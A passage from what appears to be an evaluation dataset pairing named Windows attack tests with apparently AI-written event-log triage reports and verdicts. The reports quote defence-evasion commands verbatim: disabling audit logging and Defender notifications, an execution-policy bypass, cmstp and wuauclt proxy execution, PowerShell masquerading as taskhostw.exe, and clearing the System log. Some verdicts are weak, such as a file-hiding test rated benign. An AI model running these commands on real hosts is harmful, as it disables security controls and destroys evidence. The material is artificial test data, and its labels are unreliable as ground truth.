   - The execution of `whoami.exe` and similar commands by `SERVER002\admin_test` is not inherently suspicious, as it often occurs when administrators perform system checks or execute scripts.
   - The presence of conhost.exe being associated as a parent or child process further corroborates legitimate console host operations rather than direct command-line process abuse.

2. **Registry Modification:**
   - There is a suspicious command executed by `cmd.exe` using the `reg.exe` process to modify a registry key: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System` to disable password change with a command `/v DisableChangePassword /t REG_DWORD /d 1 /f`.
   - Altering registry keys in this manner, especially related to user password settings, can be an indicator of potentially malicious behavior, as it modifies system policies affecting user accounts.

3. **Edge Update Processes:**
   - The logs show numerous executions related to Microsoft Edge update processes, including `MicrosoftEdgeUpdate.exe` and COM registration helpers. Such processes are part of standard update activities for Microsoft Edge.
   - The activities related to Edge updates are consistent with common behavior during updates or maintenance.

4. **Time Change Events:**
   - There are logs indicating changes in system time by `svchost.exe`. While time changes can be normal, if unauthorized, they could be used to evade certain types of anomaly detection.
   - The reason for time change is logged as `Reason: 1`, typical for synchronization via `time.windows.com`, indicating it might be a routine sync rather than malicious tampering.

5. **Security and Audit Logs:**
   - The presence of a logon event (4624) by `admin_test` with high privileges including `SeDebugPrivilege` and `SeImpersonatePrivilege` can raise suspicion if unexpected, but these may also indicate scripts ran by heightened privileges.
   - The log indicates NTLM authentication, which is not suspicious by itself but worth noting for security patterns.

### Conclusion:

The analysis did not find conclusive signs of outright malicious activity, but several events, particularly the registry change command coupled with the timing and privilege usage, warrant closer inspection.

### Assessment:

- **Resolution: SUSPICIOUS** - The registry key modification to disable password changes suggests further investigation is necessary. While some activities appear benign under administrative contexts, this particular modification could be part of an unauthorized attempt to alter user control settings.

### Recommendation:

- Investigate the origin and intent of the command modifying the registry, and verify whether this was an authorized change by an administrator.
- Review the privileges of the `admin_test` account to ensure that no unauthorized access or privilege escalation is occurring.
- Monitor system time changes to confirm they align with known scheduled events, such as time synchronization processes.
- Consider reviewing additional logs (such as PowerShell or specific process logs) to further correlate activities and identify possible entry points or malicious scripts."
Launches an executable using Rundll32 and pcwutl.dll,"After reviewing the provided Windows event logs, here's the detailed analysis conducted across the different logs:

### System and Security Logs:
1. **Time Changes**: 
   - Several events indicate the system's time was set back slightly (`EventID: 24`). 
   - The Windows Time Service synchronized this with an NTP server (`EventID: 35`). 
   - These timestamp adjustments are typical in a synchronized environment and don't inherently suggest malicious activity.

2. **Logins and Privileges**: 
   - The `Security` log details a login by the user `admin_test` with high privileges including `SeDebugPrivilege` and others (`EventID: 4672`). 
   - This access is typically associated with administrative actions. However, seeing such a collection of privileges might be a security concern, requiring verification that `admin_test` should have these rights.

### Sysmon Logs:
1. **Process Executions**:
   - Multiple `wevtutil.exe` and `conhost.exe` processes were started under the user `admin_test`. `wevtutil.exe` is used for event log management.
   - The sequence involving `rundll32.exe` and `notepad.exe` initiated via `cmd.exe` appears benign, though `rundll32.exe` is sometimes used in attacks disguising its true intention. 
   - `whoami.exe`, `hostname.exe`, and standard Windows command-line tools executions are seen, which may be typical administrative actions.
   
2. **Microsoft Edge Update**:
   - Numerous activities involving `MicrosoftEdgeUpdate.exe` are logged, corresponding to automatic update mechanisms of Microsoft Edge. Anomalies in update process binaries typically require verification of the binary's integrity to confirm legitimacy.

3. **Command Line Arguments**:
   - No suspicious command-line arguments directly indicating malicious intent like obfuscated scripts or specific indicators of a payload are present.

### Application Logs:
- **Edge Update Events**: Events are logged for the service starting and stopping (`EventID: 0`). This is consistent with update cycles for applications and appears typical.

### Summary Assessment:
- **BENIGN**: At present, there is no definitive evidence of malicious activity. The majority of events are consistent with administrative tasks or automated system functions like time synchronization and software updates.
- **SUSPICIOUS**: The extensive use of administrative privileges by `admin_test` and multiple back-to-back executions might raise an eyebrow for insider threat potential or inadvertent privilege misuse. It merits verification of the user’s activities and role, especially given some command executions and privilege elevation.

### Resolution:
The logs do not present a definitive cause for classified as `MALICIOUS`. However, they warrant a `SUSPICIOUS` resolution based on your company’s risk openness. This suggests more detailed review and possibly further actions such as:
- Confirming the legitimacy of administrative actions performed by `admin_test`.
- Monitoring network behavior and access patterns for anomalies.
- Verifying binary integrity, particularly of the Edge updates, to ensure they haven't been tampered with. 

Proceed with due diligence to either elevate any identified threats into a security incident or clear the suspicion with factual validations."
Delete Microsoft Defender ASR Rules - InTune,"After a thorough review of the provided Windows event logs across the System, Sysmon, Application, and Security channels, here are the key observations:

1. **Time-related Events:**
   - Several events indicate a short period where the system time was altered. The entries from the Security and System logs (EventID 4616, 24, and 1) show changes in the system time executed by `svchost.exe`. Time adjustments, especially those conducted by system processes such as `svchost.exe`, are not necessarily suspicious on their own, as they often occur due to synchronization tasks with NTP servers (e.g., `time.windows.com`).

2. **Privilege Escalation and High Integrity Levels:**
   - The user `admin_test` has been observed executing Windows PowerShell and certain processes with high integrity levels, suggesting it may have administrative privileges. The Security log entries (EventID 4672) confirm the assignment of high privileges, including `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`.

3. **PowerShell Activity:**
   - In the Windows PowerShell and Sysmon logs, there is activity suggesting the modification of registry keys related to Windows Defender's ASR (Attack Surface Reduction) rules. This action involved creating and deleting registry entries, which could be legitimate for administrative setup or configuration. However, altering Defender settings can sometimes be characteristic of certain attack vectors, where attackers attempt to disable protective features.

4. **EdgeUpdate Activity:**
   - Several Sysmon log entries show activity related to the `MicrosoftEdgeUpdate.exe`, indicating both updates and installations. While these can be commonplace for updating Microsoft Edge, the sheer frequency and variety of related events suggest a thorough review of Microsoft Edge's update behavior on this system to confirm conformity with expected operations.

5. **Network Service and System-level Processes:**
   - Processes like `sppsvc.exe` and `TiWorker.exe` running under `NT AUTHORITY\NETWORK SERVICE` and `NT AUTHORITY\SYSTEM` are essential system processes. There's no indication from the logs that these processes are behaving anomalously.

**Overall Assessment:**
- **SUSPICIOUS**

**Considerations & Next Steps:**
1. **Further Investigation of PowerShell Scripts:**
   - Investigate the source and purpose of the PowerShell script that modified the registry settings related to Windows Defender. Ensure that these changes were authorized and consistent with the organization's security policies.
   
2. **Review EdgeUpdate Activity:**
   - Validate the legitimacy of the EdgeUpdate processes and ensure that these updates align with scheduled maintenance or update windows. Confirm that there is no unauthorized software update or installation being executed under the guise of a legitimate service.

3. **Time Synchronization Confirmation:**
   - Verify that the time adjustments correspond with scheduled NTP synchronizations, and ensure that no anomalies exist with system time settings that might affect security log accuracy.

By proceeding with these steps, the security of the host can be further assessed, potentially uncovering any unauthorized changes or malicious behavior masked within otherwise legitimate processes."
Disable Windows Command Line Auditing using Powershell Cmdlet,"Upon reviewing the event logs provided, several observations and findings are noted:

1. **Registry modification via PowerShell**:
    - In the Sysmon logs and Windows PowerShell logs, an instance of PowerShell is run with a command modifying the registry:
      ```powershell
      New-ItemProperty -Path ""HKLM:Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"" -Name ""ProcessCreationIncludeCmdLine_Enabled"" -Value 0 -PropertyType DWORD -Force
      ```
    - This command potentially alters the auditing settings for process creation, which could be used to cover tracks of malicious activities by preventing command lines from being logged in events. This action is suspicious and warrants further investigation to determine if it was authorized or potentially malicious activity.

2. **Frequent use of administrative utilities**:
    - In the Sysmon logs, regular execution of `wevtutil.exe` and `conhost.exe` is observed under the user `SERVER002\admin_test`. While these utilities are standard Windows tools, the repetitive execution could suggest scripting or automation, possibly for maintenance or further investigation. 

3. **Time synchronization events**:
    - The Security logs show two events where the Windows time was adjusted. It is seen in Event ID 4616, and Kernel-General Event IDs 1 and 24, reflecting changes in system time. While time adjustments can be part of standard operations, if unauthorized, they could be used to manipulate timestamps for log entries.

4. **Microsoft Edge Updates and processes**:
    - There are numerous Edge Update events and processes running under `NT AUTHORITY\SYSTEM`. This activity appears consistent with software update processes, which are typically benign if expected.

5. **System Protection Events**:
    - The Application log contains an entry from the Software Protection Service, though it appears to be standard logging without any indication of compromise.

### Assessment & Recommendation:
- The most notable concern is the PowerShell execution altering registry audit settings, as this can be indicative of an attempt to evade detections or forensic timeline analysis. This activity should be flagged as **SUSPICIOUS** and requires further investigation to determine if it was executed by an authorized admin with a legitimate purpose or if it could be part of a malicious campaign.
  
- **Resolution**: SUSPICIOUS

**Next Steps**:
- Investigate the source and context of the PowerShell command execution. Identify the user `admin_test` and confirm whether they performed this action legitimately.
- Monitor for other unauthorized activities or account anomalies associated with `admin_test`.
- Review policies and procedures for access management and auditing to ensure changes to registry audit settings are monitored and controlled.
- If possible, restore previous audit settings and verify integrity of security-related logs."
Disable Remote Desktop Anti-Alias Setting Through Registry,"After analyzing the provided Sysmon log entries, here is a detailed assessment:

### Observations:

1. **Whoami.exe Execution:**
   - The `whoami.exe` tool, used to display login user information, was executed. The parent process was `wsmprovhost.exe`, which is a legitimate Windows process and part of the Windows Remote Management (WinRM) service.

2. **Conhost.exe Associations:**
   - `Conhost.exe` is associated with terminal processes like cmd.exe or whoami.exe. Its presence appeared normal as it was consistently a child process of expected parent processes, such as `whoami.exe` and `cmd.exe`.

3. **EdgeUpdate Processes:**
   - Executions of `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateSetup_X86_1.3.195.27.exe` were observed under `NT AUTHORITY\SYSTEM`. These are expected for the functionality of updating Microsoft Edge.
   - A `Temp` directory was noted in one path, which can occur in specific scenarios but should be monitored for abnormal behavior.

4. **Wevtutil.exe Execution:**
   - `Wevtutil.exe` was executed multiple times. This utility is used for managing event logs, and such activity could indicate log manipulation attempts, although it also has legitimate uses for querying logs.

5. **Suspicious Registry Modification:**
   - The command `cmd.exe /c reg add ...` indicates a registry modification to disable Remote Desktop antialiasing settings. While this can be legitimate, the lack of known administrative tasks around this time can be suspicious without proper justification.
   - The execution of `cmd.exe` and `reg.exe` in altering registry settings, especially related to `HKEY_LOCAL_MACHINE` by a user with high integrity level, is potentially indicative of configuration or policy manipulation, possibly aligning with a technique used for persistence or evasion.

### Analysis:

- **Runner Processes**: Routine execution of `whoami.exe`, `conhost.exe`, and updates for `MicrosoftEdgeUpdate.exe` and others under `NT AUTHORITY\SYSTEM` do not display inherently malicious behavior. The paths and execution contexts align with typical Microsoft operations.
  
- **Wevtutil Execution**: The repeated execution of `wevtutil.exe` could indicate normal log querying activity if corresponding to legitimate administrative activities. However, such repeated instances noted closely in time might suggest attempts to manipulate or clear logs, which is often a step taken post-exploitation.

- **Registry Modification**: The command-line operation modifying registry settings without a clear administrative or update purpose raises a flag. Registry changes affecting remote desktop configurations are noteworthy, as they can be involved in lateral movement or persistence strategies.

### Recommendations:

1. **Investigate Purpose and Source of Registry Changes**: It would be prudent to verify if these registry modifications were intended updates or administrative changes. Cross-reference with any change requests or administrator activities during this period.

2. **Review Wevtutil and Log Management Activities**: Determine if these actions correspond with a legitimate log management or audit process. If not, consider this as potentially suspicious and investigate further.

3. **Monitoring and Alerts**: Implement monitoring for similar command-line registry changes and wevtutil usage, coupled with context analysis on corresponding activities to distinguish between legitimate and suspicious actions.

### Conclusion:

The analysis suggests the current logs indicate a **SUSPICIOUS** classification. Though no definitive sign points towards a compromise, certain actions, particularly the registry modification and use of `wevtutil`, necessitate further investigation. Anomalies should be escalated to the appropriate security or system administration team for further review and confirmation."
Change Powershell Execution Policy to Bypass,"Upon reviewing the provided logs, there are several aspects to discuss regarding possible indicators of suspicious or malicious activity:

1. **Sysmon Logs Analysis:**
   - Multiple instances of `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` being executed:
     - The frequent execution of `wevtutil.exe` could indicate attempts to manipulate event logs, which is common in scenarios where an adversary tries to cover tracks. However, there are no indications of command-line arguments provided in the logs, which could make such activity suspicious.
     - The `Set-ExecutionPolicy -ExecutionPolicy Bypass` command line used with `powershell.exe` is worrisome because it can indicate an attempt to bypass PowerShell execution policies to run potentially malicious scripts. This is a common red flag for malicious activity. 

2. **EdgeUpdate Activity:**
   - The logs show a scheduled Edge Update process (`Microsoft Edge Update`) being executed. While these processes (such as `MicrosoftEdgeUpdate.exe`) are legitimate, the complexity and frequency could create a situation where an attacker blends malicious commands to leverage Edge Update processes for privilege escalation or remote code execution.

3. **System Logs & Time Change Events:**
   - A series of time change events are noted in the system logs. These events could be routine system adjustments from ntp servers (`time.windows.com`). However, unexplained time changes can sometimes indicate attempts to alter log or alert timestamps maliciously.

4. **Security Logs Analysis:**
   - There's no direct indication of spike in unauthorized access attempts or privilege escalation in these limited security logs.

5. **PowerShell Logs Analysis:**
   - The execution policy behavior noted in the PowerShell logs aligns with the Sysmon logs, confirming an execution policy bypass.

### Assessment:
- The frequent and varied legitimate Windows processes observed (such as `wevtutil.exe`, `powershell.exe`, `whoami.exe`) with potentially suspicious execution parameters, and the changing of execution policies suggest the possibility of malicious intent.

- The behavior observed in the logs, such as execution policy bypass in PowerShell, aligns with known techniques used in attacks targeting Windows systems to run scripts with elevated privileges or to obfuscate actions.

### Resolution:
- **SUSPICIOUS**: The activity observed in the logs needs further investigation. While there are legitimate processes, their combination, coupled with the execution command `bypass`, is suspicious and warrants deeper inspection to rule out malicious intentions.

### Guidance for Further Action:
- Enable enhanced logging for `PowerShell` and examine the contents of scripts executed during the time frames noted.
- Conduct a more detailed forensic examination focusing on the execution history and use of `wevtutil.exe` to identify any further signs of log tampering.
- Review security configurations and apply stricter execution policies or application whitelisting to prevent policy bypasses.
- Monitor for any continued suspicious behavior and alert the security team if any anomalies are detected or if suspicious activity increases."
Create and start Hyper-V virtual machine,"Upon a thorough review of the Windows event logs provided, here is a detailed analysis based on the various entries from PowerShell, System, Security, and Sysmon logs:

### PowerShell Logs:
- The logs indicate PowerShell execution with the command `powershell.exe & {$VM = ""file VM""; New-VM -Name $VM -Generation 2; Set-VMFirmware $VM -EnableSecureBoot Off; Start-VM $VM}`.
- The process involves creating a new virtual machine (VM), modifying its firmware settings, and starting it. While this activity is typically associated with virtualization tasks, it is uncommon on a production server without specific need or context.
- If these actions were not sanctioned or expected, it could be a sign of unauthorized or malicious activity, potentially setting up an environment for further attacks.

### System Logs:
- Logs show normal system activities such as changes made by `svchost.exe` related to time adjustments. No immediate suspicious activity detected here.
  
### Security Logs:
- Security logs indicate tiny timestamp adjustments, a benign occurrence as reflected by `svchost.exe` process performing time synchronization activities.

### Sysmon Logs:
- The logs reflect numerous process creations related to Microsoft Edge Update processes, which is routine for software updates and maintenance.
- A notable entry involves a PowerShell instance using the same script as in the PowerShell logs, initiated by a user with high integrity level privileges (`SERVER002\\admin_test`). This raises the same concern as noted in the PowerShell log.

### Overall Assessment:
The crux of the log analysis revolves around the PowerShell script seen in both PowerShell and Sysmon logs. The script conducts activities associated with virtual machine creation and configuration, which might be benign in a testing or development server but potentially suspicious if unexpected in a production environment. 

### Resolution: **SUSPICIOUS**
- The creation and manipulation of VMs without explicit approval can present numerous security risks, such as unauthorized data exfiltration or sandbox evasion.
- It is recommended to verify with the user `admin_test` if these actions were legitimate and to check if such VM activities align with the organization's IT policy.

### Recommendations:
1. **Investigate the User Intent**: Cross-check with the user `admin_test` about the usage of the PowerShell script.
2. **Review Access Logs**: Ensure no unauthorized user accessed or ran scripts under `admin_test`.
3. **Monitor Network Traffic**: Look for unusual patterns, especially involving VM network interfaces.
4. **Enforce PowerShell Logging**: Enable more detailed script block logging for future auditing.
5. **Evaluate VM Policies**: Ensure VM creation is strictly monitored and requires higher-level approvals in sensitive environments.

Further immediate action would rely on the context and explanation provided by the involved parties and management."
CMSTP Executing Remote Scriptlet,"After a careful analysis of the provided Windows event logs, several points stand out that require further examination:

1. **Series of Edge Update Events**:
   - There are multiple entries relating to Microsoft Edge Update activity. This includes setups being executed and services registering. While such activities can be normal for software update processes, the high frequency and concentration of these events could indicate either a legitimate updated deployment or potentially a malicious actor attempting to cover their tracks by embedding malicious code in commonly updated software.

2. **Process Execution Patterns**:
   - There are several instances where `powershell.exe`, `cmd.exe`, and `cmstp.exe` are executed. These processes, especially when involving `cmd.exe` with parameter `cmstp.exe` installing a `.inf` file, are considered atypical and may suggest an attempt to execute scripts or commands that could be malicious.
   - These processes are executed by the user `SERVER002\admin_test`, suggesting this account might have been compromised, or it's acting on a scheduled task or script that's executing potentially risky operations.

3. **Suspicious Command Lines**:
   - The command line `cmd.exe /c cmstp.exe /s ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.003\\src\\data.003.inf""` stands out. The use of `cmstp.exe` is known to be exploited in certain attacks to bypass User Account Control (UAC) and execute arbitrary commands.

4. **Security and Privilege Escalation Events**:
   - The logs do show a high number of privileges being assigned (Event ID 4672 with high privileges such as SeDebugPrivilege, SeAssignPrimaryTokenPrivilege), which may indicate a privilege escalation attempt.

5. **Execution with High Integrity Levels**:
   - Some processes are executed with high integrity levels which may suggest potential unauthorized use of administrative privileges.

**Assessment**:
Given the risks highlighted by unusual command executions, especially using `cmstp.exe`, along with frequent Edge Update activities and high-integrity level executions, this system's behavior is classified as **SUSPICIOUS**. These could either be indicators of a sophisticated attack vector being employed or misconfigured, legitimate administrative tasks. 

**Guidance and Next Steps**:
- **Immediate Investigation**: Check for any unauthorized changes in system files and configurations, particularly involving Edge updates and cmstp.exe.
- **Account Review**: Verify the activity of the `admin_test` account for unauthorized access and review access logs.
- **Network Monitoring**: Look for unusual outbound traffic from the host, as it might indicate data exfiltration.
- **Malware Scan**: Run comprehensive antivirus and anti-malware scans using the latest definitions to check for infections.
- **Logging and Monitoring**: Enhance logging mechanisms and intrusion detection/prevention systems (IDS/IPS) for catching further unauthorized attempts.

Finalize this case as **SUSPICIOUS** pending further investigation and verification."
Suppress Win Defender Notifications,"Upon reviewing the provided logs, there are several points of interest that might warrant further investigation:

1. **Time Change Events (Security and System Logs)**:
   - There are two Event ID 4616 entries (from the Security log) and corresponding Event ID 1 entries (from the System log) indicating that the system time was changed. This is generally an unusual activity and could potentially be malicious, as attackers sometimes change system time settings to avoid detection or confuse log timelines. However, the process responsible (`svchost.exe`) is commonly associated with legitimate activity, which may be benign if caused by a legitimate time-sync or an update process.

2. **Account with Privileged Access (Security Logs - Event ID 4672)**:
   - User ""admin_test"" is assigned multiple privileges, including ones generally associated with security-sensitive tasks (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, `SeLoadDriverPrivilege`, etc.). While having privileges is not inherently suspicious if warranted, the combination and enumeration of these privileges merit validating the necessity and normalcy of this user's access level.

3. **Unusual Activity with CMD and Registry (Sysmon Logs)**:
   - There is a CMD process (PID 3860, Sysmon Event ID 1) executing a command to suppress Windows Defender notifications: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration"" /v Notification_Suppress /t REG_DWORD /d 1 /f`. This action is suspicious as attackers may disable security notifications to remain undetected.

4. **Processes Executed by 'admin_test'**:
   - Multiple legitimate system utilities (`wevtutil.exe`, `conhost.exe`, `whoami.exe`, etc.) are executed by ""admin_test."" While these activities seem benign, the context under which these tools are executed (especially in quick succession) could signify anomalous behavior aimed at system enumeration or configuration adjustments.

5. **Multiple EdgeUpdate Processes (Sysmon Logs)**:
   - Numerous entries related to Microsoft Edge Update service show various executables being run, which generally indicates a legitimate software update. However, they appear frequently and almost simultaneously, which may warrant checking if these updates align with scheduled tasks or if they could be related to a deception attempt.

**Assessment**:
The log entries present several indicators that may warrant further investigation to discern the intent and authenticity of the activities:
- The time change events.
- Registry modifications by the CMD process to suppress Windows Defender notifications.
- Use of privileged commands by ""admin_test.""
- High privilege levels of ""admin_test.""

Given these points, it is appropriate to classify this situation as **SUSPICIOUS**. 

**Recommendation**:
- Investigate the necessity of time changes and whether they coincide with legitimate scheduled tasks or updates.
- Confirm the intent and legitimacy of actions taken by ""admin_test,"" particularly around security configurations like Windows Defender settings.
- Validate the necessity for ""admin_test"" having extensive privilege sets and whether such access is typical for their role.
- Review any recent Microsoft Edge updates scheduled or known issues that could cause abnormal update behavior.

Further investigation should focus on confirming the legitimacy of 'admin_test' activity, the alignment of behavior with standard company practices, and addressing any potential security gaps these activities may suggest."
Masquerading - powershell.exe running as taskhostw.exe,"Upon analyzing the provided Windows event logs, I have identified several points of interest that are indicative of potential malicious activity.

1. **PowerShell Activity**: 
   - The PowerShell logs indicate the execution of a `taskhostw.exe` from an unusual location: `C:\Users\admin_test\AppData\Roaming\`. Typically, `taskhostw.exe` is a legitimate Windows process located in the `System32` directory. Its presence and execution from an alternate directory could indicate that a potentially harmful PowerShell script is being executed under the guise of `taskhostw.exe`.

2. **Sysmon Logs Involvement**:
   - Several entries indicate a suspicious command being issued: `cmd.exe /c copy %windir%\System32\windowspowershell\v1.0\powershell.exe %APPDATA%\taskhostw.exe /Y & cmd.exe /K %APPDATA%\taskhostw.exe`. This behavior shows that the PowerShell executable is being copied and renamed as `taskhostw.exe` within the `APPDATA` directory and then executed. This tactic is commonly used by malware to evade detection by masquerading as a legitimate process.
   - The launching of `POWERHST_NAME` as a PowerShell process confirms the execution strategy observed in the logs.

3. **Privileged Actions and Process Executions**:
   - There are multiple processes running from the `System32` directory under the user `NT AUTHORITY\SYSTEM` which is common. However, the `taskhostw.exe` execution from the user’s `APPDATA` directory remains a high point of suspicion.

4. **Security Log Events**:
   - Event ID 4624 and 4672 showed logons with elevated privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc.), which in combination with the unauthorized process behavior indicates a significant risk.
   - The presence of Event ID 4799 suggests activity involving group membership enumeration, which could potentially relate to reconnaissance activities often seen in lateral movement phases of an attack.

Given the suspicious pattern of execution involving `taskhostw.exe` outside of its normal context, coupled with privilege token activities and command execution using PowerShell, a high likelihood of system compromise exists.

**Assessment**: MALICIOUS

**Guidance on How to Proceed**:
- Isolate the affected system to prevent potential lateral movement or further infection.
- Conduct a detailed forensic analysis on the `taskhostw.exe` found within the `C:\Users\admin_test\AppData\Roaming\` folder to ascertain its origin and actions.
- Initiate a comprehensive endpoint security solution scan across the network to detect similar unauthorized behavior.
- Review user accounts and permissions, especially those with high privilege to ensure they have not been compromised.
- Update the organization's cybersecurity measures to ensure better monitoring and reduce the windows of exploit by attackers in the future."
Load Arbitrary DLL via Wuauclt (Windows Update Client),"Upon analyzing the provided logs, the following observations and analysis have been made:

### Key Observations:

1. **Process Execution and Image Paths:**
   - A series of processes are being launched in a short time frame with the user `SERVER002\admin_test`. These include `powershell.exe`, `wevtutil.exe`, `wuauclt.exe`, and `cmd.exe`.
   - The execution of `wuauclt.exe`, `cmd.exe`, and PowerShell from paths like the `TEMP` directory could potentially indicate malicious activity, as these are commonly used in techniques for executing unauthorized tasks or payloads like DLLs.

2. **Suspicious Command Lines:**
   - The command `cmd.exe /c wuauclt.exe /UpdateDeploymentProvider ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\bin\calc.dll"" /RunHandlerComServer` aligns with known techniques for sideloading malicious DLLs using legitimate Windows binaries. This is an indicator of potential malicious activity.

3. **High Privileged Processes:**
   - The Sysmon logs capture processes running with High Integrity Level which denotes administrative privileges. The use of high privilege levels for executing potentially harmful processes is concerning.

4. **Logon and Privilege Escalation Events:**
   - The security logs contain multiple entries for Event ID 4672, which logs the assignment of special privileges to new logons. This could indicate attempts to execute tasks requiring such privileges.

5. **Account Enumeration:**
   - Event ID 4798 indicates account enumeration, which could be used for gathering information on accounts present on the system.

6. **Absence of Details in Application and System Logs:**
   - The `Application` and `System` logs do not provide substantial information related to the suspicious activities observed in the `Sysmon` and `Security` logs.

### Assessment:
The combination of potentially harmful command-line usage, high-integrity level execution, and account enumeration are red flags in security monitoring. The context of using `wuauclt.exe` for DLL execution strongly suggests an attempt to execute unauthorized tasks potentially for malicious intent.

### Conclusion:
Based on the logs evaluated and the presence of identified suspicious behavior, this activity is classified as **MALICIOUS**. There are clear indicators of attempts to execute unauthorized, potentially harmful operations, potentially indicating a compromise.

### Recommendations to Proceed:
1. **Immediate Containment:**
   - Isolate the affected systems to prevent lateral movement or further exfiltration of data.
  
2. **Incident Response:**
   - Initiate an incident response to identify the extent of the compromise, root cause analysis, and remediate affected systems.

3. **Review Accounts:**
   - Audit privileged access and review accounts for any unauthorized changes.

4. **Malware Analysis:**
   - Analyze the `calc.dll` present in the TEMP path and any other suspicious binaries for malicious content.

5. **Audit and Monitoring:**
   - Enhance auditing of PowerShell, command-line arguments, and script execution.
   - Deploy or update existing Endpoint Detection and Response (EDR) tools to detect suspicious behavior.

These steps will help in counteracting the suspected malicious activities and enhance overall system security posture."
Invoke-ATHRemoteFXvGPUDisablementCommand base test,"### Detailed Analysis of the Logs

The provided logs contain various Windows event types across different logs, which I have analyzed for any indicators of potential malicious activity:

1. **Security Log Analysis:**
   - **User Enumeration Events**: The appearance of EventID 4798 (Enumerated user's local groups) multiple times with different user accounts such as `Guest`, `Administrator`, `admin_test`, etc., suggests potential enumeration activity. Typically, `CompatTelRunner.exe` is associated with Windows telemetry; its recurrent enumeration of users is somewhat unusual.
   - **Privilege Escalation**: EventID 4672 indicates special privileges were assigned to the SYSTEM account, which is typical in legitimate scenarios, but should be correlated with more context to determine its full relevance.
   
2. **Sysmon Log Analysis:**
   - **PowerShell Usage**: There are multiple Sysmon EventID 1 logs for `powershell.exe` with the `CommandLine` showing `Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $PWD`. This command doesn't appear to be typical. The use of PowerShell scripts in administrative contexts can often be a red flag, especially if the command is launching from temporary directories and includes unknown or unclear script functions.
   - **Multiple Conhost Processes**: Repeated spawning of `conhost.exe` in conjunction with various scripts and commands could suggest attempts to hide process execution.
   - **Event Log Manipulation**: Execution of `wevtutil.exe` multiple times indicates potential efforts to gather or clear event logs, particularly suspicious in the context of other activities observed.

3. **Windows PowerShell Log Analysis:**
   - **PowerShell Session**: The logs confirm the execution of the above PowerShell commands which are somewhat unusual and potentially unauthorized, especially in unclear contexts.

### Assessment and Conclusion

- **Suspicious Behavior Identified**: The repeated enumeration of users by `CompatTelRunner.exe` combined with the invocation of non-standard PowerShell scripts suggests the potential for malicious activity or attempted lateral movement within the network.
- **Potential Threats**: The synchronous execution of PowerShell scripts, potential log manipulation activities, and enumeration of high-privilege accounts point to a scenario where credentials could be compromised or misused.

### Guidance on How to Proceed:

- **Resolution: SUSPICIOUS**
  - **Immediate Actions**: 
    - Start a deeper investigation of specific `PowerShell` sessions and commands executed around the same timestamp.
    - Examine the network and system configuration for traces of privilege escalation or lateral movement attempts.
    - Monitor for any further irregular behavior from the identified user accounts or processes.
  - **Preventive Measures**: 
    - Implement stricter monitoring and alerts for unusual `PowerShell` activity and account enumerations.
    - Restrict telemetry processes from unnecessary access to sensitive user accounts and groups.
    - Review and enforce least privilege access controls for sensitive permissions and accounts. 

These logs warrant further investigation to ensure no malicious foothold has been established within the environment."
Create Windows System File with powershell,"After a thorough review of the provided event logs, here is the analysis and assessment:

### Analysis:
1. **EdgeUpdate Events:** The logs indicate multiple executions of processes related to Microsoft Edge Update. The processes involve updates and component registrations, which appear routine and executed under the `NT AUTHORITY\SYSTEM` account. Such activity is common during scheduled updates of Microsoft software, such as Edge browser components.

2. **Command Line Activity with `cmd.exe`:** There are multiple instances of `cmd.exe` being invoked with commands such as:
   - `IF EXIST %%temp%%\data.txt ( EXIT 0 ) ELSE ( EXIT 1 )`
   - `echo system_Attrib_data >> %%temp%%\data.txt`

   These commands are mainly checking for file existence and writing data to a temporary file. While scripting activities can potentially be exploited for malicious purposes, these specific command-line activities do not showcase any standard indicators of compromise. They seem consistent with administrative scripting tasks or automated system checks.

3. **PowerShell Activity:** Instances of PowerShell running commands like altering file attributes:
   - `powershell.exe & {$file = Get-Item $env:temp\data.txt -Force; $file.attributes='System'}`

   This command sets the 'System' attribute on a temp file, possibly to hide it. Although this could be suspicious, there is insufficient context to conclusively label this as malicious. Such scripts could be part of legitimate system management activities unless accompanied by other signs of compromise.

4. **Sysmon Logs & Integrity Level:** The processes primarily have a `High` integrity level, indicating execution with elevated privileges but within expected parameters for the user `SERVER002\admin_test` and `NT AUTHORITY\SYSTEM`. Such elevation is typical for administrative tasks or updates and should not immediately raise an alarm unless tied to unapproved activities.

5. **No Unknown or Anomalous Processes:** There are no unknown executable paths or unfamiliar processes that deviate from standard installed applications like Edge or Windows utilities.

### Assessment:
Based on the logs:
- There is a lot of legitimate activity related to Microsoft Edge update processes.
- Command-line activity involving `cmd.exe` and PowerShell does not immediately stand out as threatening without further context.
- The activations are in line with routine system maintenance tasks.

### Resolution:
- **Resolution: BENIGN**

**Guidance:**
- Continue monitoring these activities to ensure they align with routine system updates and maintenance.
- Audit any automated scripts running on `Server002` to ensure there are no unauthorized changes.
- Implement more granular auditing if necessary to catch any future anomalies or unauthorized changes during similar update activities.

Overall, there is no strong indication of malicious activity based on the provided logs."
Clear Logs,"After reviewing the provided Windows event logs, I have the following findings:

1. **Use of Command-Line Tools (`whoami.exe`, `cmd.exe`)**:
   - Multiple instances of standard Windows command-line tools like `whoami.exe` and `cmd.exe` are observed running under the user `SERVER002\admin_test`. This behavior could be routine if associated with normal administrative tasks, but it may also indicate exploration by an attacker attempting to understand their privileges or perform reconnaissance.
   - The command `cmd.exe /c wevtutil cl System` is used, which implies clearing the System Event Log. This is particularly concerning as attackers often clear event logs to cover their tracks after malicious activity.

2. **Service and Process Execution**:
   - The `edgeupdate` service seems to have been stopped several times in quick succession. While the Edge Update process is legitimate, multiple quick successions can sometimes indicate an issue or interference.
   - `MicrosoftEdgeUpdate.exe` appears to have spawned multiple times with different command-line parameters, indicating updates were occurring. This looks like benign update behavior of Microsoft Edge.

3. **Execution of `wevtutil.exe`**:
   - Several `wevtutil.exe` processes were invoked. This utility is used to manage event logs. Given that one instance was used in conjunction with `cmd.exe` to clear the System Event Log (`cl` flag), it is suspicious. Normally, administrators do not frequently clear such logs, especially in the absence of major administrative changes or system setups.
   
4. **Activity Patterns**:
